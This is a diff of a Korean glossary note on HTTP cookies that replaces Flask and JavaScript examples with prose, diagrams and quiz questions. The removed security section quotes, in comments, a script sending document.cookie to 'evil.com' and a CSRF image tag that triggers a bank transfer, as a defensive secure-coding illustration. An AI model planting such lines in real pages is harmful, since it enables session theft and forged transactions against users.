@@ -2,389 +2,96 @@
 
 ## 📝 정의
 
-Cookie(쿠키)는 **웹사이트가 사용자의 브라우저에 저장하는 작은 데이터 파일**로, 사용자를 식별하고 상태를 유지하는 데 사용됩니다.
+쿠키는 **서버가 브라우저에 맡겨두고 매 요청마다 돌려받는 쪽지**다.
 
-### 핵심 개념
+HTTP 는 요청 하나가 끝나면 방금 누가 다녀갔는지 기억하지 않는다. 로그인 상태를 이어가려면 브라우저 쪽에 표식을 남기고 그것을 매번 같이 보내는 수밖에 없다.
 
-- **무엇인가?**: 브라우저에 저장되는 키-값 데이터
-- **왜 필요한가?**: HTTP는 상태가 없어서 로그인 유지 불가
-- **어떻게 작동하나?**: 서버가 Set-Cookie → 브라우저 저장 → 매 요청마다 자동 전송
+### 비유
+놀이공원 손목 밴드. 입구에서 한 번 채워주면 안에서는 그것만 보고 통과시킨다.
 
-### Cookie가 해결하는 문제
-
-**문제 상황**:
-```
-😱 시나리오: Cookie 없이 웹사이트 사용
-사용자 → 로그인 성공
-사용자 → 다음 페이지 클릭
-서버 → "누구세요?" (로그인 정보 없음)
-→ 매 페이지마다 재로그인! 😱
-```
-
-**Cookie의 해결**:
-```
-✅ 상태 유지:
-로그인 성공 → 서버가 Cookie 발급
-브라우저 → Cookie 저장
-다음 페이지 → Cookie 자동 전송
-서버 → "아, 로그인한 사용자군요!"
-→ 로그인 유지! ✅
-```
-
-**비유**:
-- **Cookie 없음** = 매번 신분증 제시
-- **Cookie** = 출입증 (한 번 받으면 계속 사용)
-
-## 📊 Cookie 동작 흐름
+## 🖼️ 그림으로 보기
 
 ```도해
-흐름: Cookie, 무슨 순서로 오가나
-브라우저 :: 로그인 요청 (ID/PW)
-서버 :: 인증 확인
-서버 :: Set-Cookie: session_id=abc123
-브라우저 :: 다음 페이지 요청 Cookie: session_id=abc1…
-서버 :: Cookie로 사용자 확인
-서버 :: 인증된 페이지 반환
+흐름: 로그인한 뒤 다음 페이지에서 나를 어떻게 알아보나
+브라우저 :: 아이디와 비밀번호를 보낸다
+서버 :: 확인하고 Set-Cookie 로 표식을 내려준다
+브라우저 :: 그 값을 저장해둔다
+브라우저 :: 다음 요청 헤더에 자동으로 붙여 보낸다
+서버 :: 값을 보고 누구인지 알아본다
+< 브라우저 :: 로그인된 화면을 받는다
+= 서버가 기억하는 게 아니라 브라우저가 매번 들고 오는 것이다
 ```
 
-## 💡 Cookie 생성 및 사용
+## ⚠️ 해결하는 문제
 
-### 서버에서 Cookie 설정
-```python
-from flask import Flask, make_response
-
-app = Flask(__name__)
-
-@app.route('/login', methods=['POST'])
-def login():
-    """로그인 시 Cookie 설정"""
-    # 인증 후
-    if authenticate(username, password):
-        response = make_response('Login successful')
-        
-        # Cookie 설정
-        response.set_cookie(
-            'session_id',
-            value='abc123',
-            max_age=3600,        # 1시간 유효
-            httponly=True,       # JavaScript 접근 차단 (XSS 방지)
-            secure=True,         # HTTPS만
-            samesite='Lax'       # CSRF 방지
-        )
-        
-        return response
-    
-    return 'Login failed', 401
-
-@app.route('/dashboard')
-def dashboard():
-    """Cookie로 사용자 확인"""
-    session_id = request.cookies.get('session_id')
-    
-    if not session_id:
-        return redirect('/login')
-    
-    # Session ID로 사용자 조회
-    user = get_user_by_session(session_id)
-    return f'Welcome {user.name}!'
-
-@app.route('/logout')
-def logout():
-    """Cookie 삭제"""
-    response = make_response(redirect('/'))
-    response.set_cookie('session_id', '', expires=0)
-    return response
+```도해
+대조: 요청 사이에 아무것도 안 남기면 어떻게 되나
+쿠키 없이 || 쿠키로
+페이지 이동 :: 매번 재로그인 || 그대로 유지
+장바구니 :: 새로고침에 날림 || 남아 있다
+서버 :: 매번 인증 처리 || 값만 확인
+= HTTP 가 기억하지 않는 자리를 쿠키가 메운다
 ```
 
-### JavaScript에서 Cookie 사용
-```javascript
-// Cookie 설정
-document.cookie = "username=john; max-age=3600; path=/";
+HTTP 는 요청마다 연결이 끊긴다. 로그인에 성공해도 다음 페이지를 여는 요청은 서버 입장에서 처음 보는 요청이다. 이 상태로는 로그인, 장바구니, 언어 설정 중 어느 것도 유지되지 않는다.
 
-// Cookie 읽기
-function getCookie(name) {
-  const cookies = document.cookie.split(';');
-  
-  for (let cookie of cookies) {
-    const [key, value] = cookie.trim().split('=');
-    if (key === name) {
-      return value;
-    }
-  }
-  
-  return null;
-}
+쿠키는 서버가 만든 값을 브라우저에 맡겨두고, 같은 도메인으로 가는 요청에 자동으로 붙여 보내게 한다. 서버는 그 값만 보고 이전 요청과 이어 붙인다.
 
-const username = getCookie('username');
-console.log(username);  // "john"
+## ⚙️ 작동 원리
 
-// Cookie 삭제
-document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+```도해
+층: 쿠키에 붙는 옵션은 무엇을 막나
+Secure :: HTTPS 가 아니면 보내지 않는다
+HttpOnly :: 자바스크립트가 못 읽는다. 탈취를 막는다
+SameSite :: 다른 사이트에서 온 요청에는 안 붙는다
+Max-Age :: 정한 시간이 지나면 스스로 사라진다
+= 옵션 없이 값만 넣은 쿠키는 아무나 읽고 아무 데서나 딸려 간다
 ```
 
-## 💡 Cookie 속성
+Domain 과 Path 는 이 쿠키를 어디로 보낼지 정한다. Domain 을 `.example.com` 으로 두면 서브도메인까지 함께 받고, Path 를 `/admin` 으로 두면 그 아래 경로에서만 붙는다.
 
-### 1. Expires / Max-Age
-```python
-# Expires: 특정 날짜에 만료
-response.set_cookie(
-    'token',
-    value='abc',
-    expires=datetime(2026, 12, 31)
-)
+SameSite 는 다른 사이트에서 시작된 요청에 쿠키를 붙일지 정하는 값이다. `Lax` 로 두면 보통의 링크 이동에는 붙지만 다른 사이트의 폼 전송에는 붙지 않는다.
 
-# Max-Age: 초 단위 수명
-response.set_cookie(
-    'token',
-    value='abc',
-    max_age=3600  # 1시간 후 만료
-)
-```
+## 📊 비교
 
-### 2. Domain
-```python
-# 특정 도메인에서만 사용
-response.set_cookie(
-    'token',
-    value='abc',
-    domain='.example.com'  # *.example.com 모두
-)
+| | Cookie | Session | JWT |
+|---|---|---|---|
+| 저장 위치 | 브라우저 | 서버 | 브라우저 |
+| 크기 | 4KB 안팎 | 제한 없음 | 수 KB |
+| 자동 전송 | 된다 | 쿠키에 실려서 | 직접 넣어야 |
+| 서버 확장 | 쉽다 | 공유가 필요 | 쉽다 |
 
-# 서브도메인 포함:
-# - example.com ✅
-# - www.example.com ✅
-# - api.example.com ✅
-```
+## 💡 실제 사례
 
-### 3. Path
-```python
-# 특정 경로에서만 전송
-response.set_cookie(
-    'admin_token',
-    value='xyz',
-    path='/admin'  # /admin/* 에서만
-)
+- **로그인 유지** 인증에 성공하면 세션 값을 쿠키로 내려주고, 이후 요청은 그 값으로 사용자를 찾는다.
+- **장바구니** 로그인하지 않은 사용자의 담은 목록을 쿠키에 넣어두고 며칠 유지한다.
+- **언어 설정** 고른 언어를 1년짜리 쿠키로 저장해 다음에 들어와도 같은 언어로 연다.
 
-# /admin/dashboard → Cookie 전송 ✅
-# /user/profile → Cookie 전송 안 함 ❌
-```
+## 🚫 흔한 오해
 
-### 4. Secure (HTTPS Only)
-```python
-# HTTPS에서만 전송
-response.set_cookie(
-    'sensitive_data',
-    value='secret',
-    secure=True
-)
+- **쿠키는 브라우저에 저장되니 안전한 곳이다** — 사용자가 열어볼 수 있고 스크립트가 훔쳐갈 수도 있다. 비밀번호나 개인 정보를 그대로 넣지 않는다.
+- **쿠키를 지우면 로그아웃된다** — 브라우저 쪽 표식만 사라진다. 서버가 그 세션을 살려두면 값을 아는 사람은 계속 들어갈 수 있다.
+- **쿠키는 광고 추적용이라 없애야 한다** — 추적에 쓰이는 것은 다른 도메인이 심는 서드파티 쿠키다. 로그인 유지에 쓰는 것과는 쓰임이 다르다.
 
-# HTTP → Cookie 전송 안 함 (보안)
-# HTTPS → Cookie 전송 ✅
-```
+## 🚨 주의사항
 
-### 5. HttpOnly (XSS 방지)
-```python
-# JavaScript 접근 차단
-response.set_cookie(
-    'session_id',
-    value='abc123',
-    httponly=True
-)
+- **세션 값은 로그인할 때 새로 발급한다.** 로그인 전에 쓰던 값을 그대로 두면 미리 심어둔 값으로 남의 계정에 들어갈 수 있다.
+- **HttpOnly 와 SameSite 는 기본으로 켠다.** 나중에 붙이려면 이미 나간 쿠키들 때문에 손대기 어려워진다.
 
-# JavaScript에서 접근 불가
-# document.cookie → session_id 안 보임
-# XSS 공격 방어!
-```
+## 📝 정리
 
-### 6. SameSite (CSRF 방지)
-```python
-# Strict: 같은 사이트에서만
-response.set_cookie(
-    'token',
-    value='abc',
-    samesite='Strict'
-)
+쿠키는 서버가 브라우저에 맡겨두고 요청마다 돌려받는 값이다. 기억하지 않는 HTTP 위에서 로그인과 장바구니와 설정을 이어 붙이는 장치다. 값 자체보다 어떤 옵션을 붙였는지가 안전을 가른다.
 
-# Lax: GET 요청은 허용 (권장)
-response.set_cookie(
-    'token',
-    value='abc',
-    samesite='Lax'
-)
+## ❓ 이해했는지
 
-# None: 모든 요청 (secure=True 필수)
-response.set_cookie(
-    'token',
-    value='abc',
-    samesite='None',
-    secure=True
-)
-```
-
-## 💡 Cookie 보안
-
-### 1. XSS 공격 방어
-```python
-# ❌ 취약: JavaScript 접근 가능
-response.set_cookie('token', 'abc123')
-
-# 공격자가 주입한 스크립트:
-# <script>
-#   fetch('https://evil.com?cookie=' + document.cookie);
-# </script>
-
-# ✅ 안전: HttpOnly 설정
-response.set_cookie(
-    'token',
-    'abc123',
-    httponly=True  # JavaScript 접근 차단
-)
-```
-
-### 2. CSRF 공격 방어
-```python
-# ❌ 취약: 다른 사이트에서도 Cookie 전송
-response.set_cookie('session_id', 'abc123')
-
-# 공격자 사이트:
-# <img src="https://bank.com/transfer?to=attacker&amount=1000">
-# → 사용자의 Cookie가 자동 전송됨!
-
-# ✅ 안전: SameSite 설정
-response.set_cookie(
-    'session_id',
-    'abc123',
-    samesite='Lax'  # 다른 사이트에서 POST 차단
-)
-```
-
-### 3. Session Fixation 방어
-```python
-@app.route('/login', methods=['POST'])
-def login():
-    """로그인 시 새 Session ID 발급"""
-    # ❌ 취약: 기존 Session ID 재사용
-    session_id = request.cookies.get('session_id')
-    
-    # ✅ 안전: 새 Session ID 발급
-    new_session_id = generate_secure_token()
-    
-    response = make_response('Login successful')
-    response.set_cookie('session_id', new_session_id, httponly=True)
-    
-    return response
-```
-
-## 🎯 Cookie vs Session vs Token
-
-| 항목 | Cookie | Session | JWT Token |
-|------|--------|---------|-----------|
-| **저장 위치** | 클라이언트 | 서버 | 클라이언트 |
-| **크기** | 4KB | 제한 없음 | 수 KB |
-| **보안** | 낮음 | 높음 | 중간 |
-| **확장성** | 높음 | 낮음 | 높음 |
-| **자동 전송** | ✅ | ❌ | ❌ |
-
-## 💡 실전 예시
-
-### 쇼핑몰 장바구니
-```python
-import json
-
-@app.route('/cart/add', methods=['POST'])
-def add_to_cart():
-    """장바구니에 상품 추가"""
-    product_id = request.json['product_id']
-    
-    # 기존 장바구니 읽기
-    cart = request.cookies.get('cart', '[]')
-    cart_items = json.loads(cart)
-    
-    # 상품 추가
-    cart_items.append(product_id)
-    
-    # Cookie 업데이트
-    response = make_response({'success': True})
-    response.set_cookie(
-        'cart',
-        json.dumps(cart_items),
-        max_age=7*24*60*60  # 7일
-    )
-    
-    return response
-
-@app.route('/cart')
-def view_cart():
-    """장바구니 조회"""
-    cart = request.cookies.get('cart', '[]')
-    cart_items = json.loads(cart)
-    
-    products = [get_product(id) for id in cart_items]
-    return render_template('cart.html', products=products)
-```
-
-### 언어 설정
-```python
-@app.route('/set-language/<lang>')
-def set_language(lang):
-    """언어 설정"""
-    response = make_response(redirect('/'))
-    response.set_cookie(
-        'language',
-        lang,
-        max_age=365*24*60*60  # 1년
-    )
-    return response
-
-@app.before_request
-def set_locale():
-    """요청마다 언어 설정"""
-    lang = request.cookies.get('language', 'ko')
-    g.locale = lang
-```
-
-## 💡 Third-Party Cookie (서드파티 쿠키)
-
-```
-First-Party Cookie:
-example.com → example.com 쿠키 설정
-→ 같은 도메인
-
-Third-Party Cookie:
-example.com → ads.com 쿠키 설정 (광고 추적)
-→ 다른 도메인
-
-# 최신 브라우저는 Third-Party Cookie 차단
-```
-
-### Cookie 동의 (GDPR)
-```html
-<!-- Cookie 동의 배너 -->
-<div id="cookie-banner">
-  이 사이트는 쿠키를 사용합니다.
-  <button onclick="acceptCookies()">동의</button>
-</div>
-
-<script>
-function acceptCookies() {
-  document.cookie = "cookie_consent=accepted; max-age=31536000; path=/";
-  document.getElementById('cookie-banner').style.display = 'none';
-}
-
-// 페이지 로드 시 확인
-if (getCookie('cookie_consent') === 'accepted') {
-  document.getElementById('cookie-banner').style.display = 'none';
-}
-</script>
-```
+- 로그인은 됐는데 다른 페이지로 가면 다시 로그인 화면이 뜬다. 무엇부터 보나?
+- HttpOnly 를 걸면 어떤 공격이 막히나?
+- 다른 사이트의 이미지 태그 하나가 내 계좌 이체를 일으킬 수 있는 이유는 무엇이고, 어떤 옵션으로 막나?
 
 ## 🔗 관련 용어
 
-- [[세션]]: Cookie로 구현
-- [[JWT]]: Cookie의 대안
-- [[CSRF]]: Cookie 기반 공격
-- [[XSS]]: Cookie 탈취 공격
-
----
-*카테고리: 보안*
-*생성일: 2026-02-14*
+- [[Session]] — 쿠키에 담긴 값으로 서버 쪽에서 찾아내는 상태
+- [[JWT]] — 서버에 상태를 두지 않는 방식. 쿠키에 담기도 한다
+- [[XSS]] — 스크립트로 쿠키를 훔쳐가는 공격. HttpOnly 가 막는다
+- [[CSRF]] — 쿠키가 자동으로 붙는 성질을 노린 공격. SameSite 가 막는다
+- [[HTTP]] — 요청 사이를 기억하지 않아서 쿠키가 생겼다
